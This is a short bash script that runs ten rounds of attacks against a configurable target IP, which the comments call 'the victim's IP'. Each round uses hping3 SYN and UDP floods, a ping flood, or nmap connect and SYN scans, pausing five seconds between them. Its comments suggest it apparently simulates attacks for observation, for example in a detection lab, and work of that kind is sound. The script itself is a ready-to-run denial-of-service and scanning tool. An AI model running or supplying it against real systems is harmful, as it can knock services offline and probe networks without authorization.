#!/bin/bash

# Target and port details
TARGET="127.0.0.1"  # Replace with the victim's IP
PORT=80                 # You can modify the port as needed

# Loop through 10 times to simulate different attack styles
for i in {1..10}
do
  echo "Attack iteration $i"

  case $((i % 5)) in
    0)
      # TCP SYN Flood - DOS attack
      echo "Starting TCP SYN Flood attack..."
      hping3 --flood --syn -p $PORT $TARGET
      ;;
    1)
      # UDP Flood - DOS attack
      echo "Starting UDP Flood attack..."
      hping3 --flood --udp -p $PORT $TARGET
      ;;
    2)
      # ICMP Ping Flood - DOS attack
      echo "Starting ICMP Ping Flood attack..."
      ping -f $TARGET
      ;;
    3)
      # TCP Connect Scan - Port scan
      echo "Starting TCP Connect Scan..."
      nmap -sT $TARGET
      ;;
    4)
      # SYN Scan - Stealthy Port scan
      echo "Starting SYN Scan..."
      nmap -sS $TARGET
      ;;
    *)
      echo "Unknown attack"
      ;;
  esac

  # Delay between attacks for visibility
  sleep 5
done
